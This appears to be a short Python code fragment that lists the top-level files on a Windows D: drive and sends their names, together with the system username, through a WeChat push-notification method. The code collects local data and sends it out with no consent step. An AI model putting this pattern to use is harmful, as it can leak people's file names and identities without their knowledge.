"""
代码有变化就执行2144
"""
import os
wjb = ''
for i in os.listdir("D:/"):
    wjb += '|文件：' + i

self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)
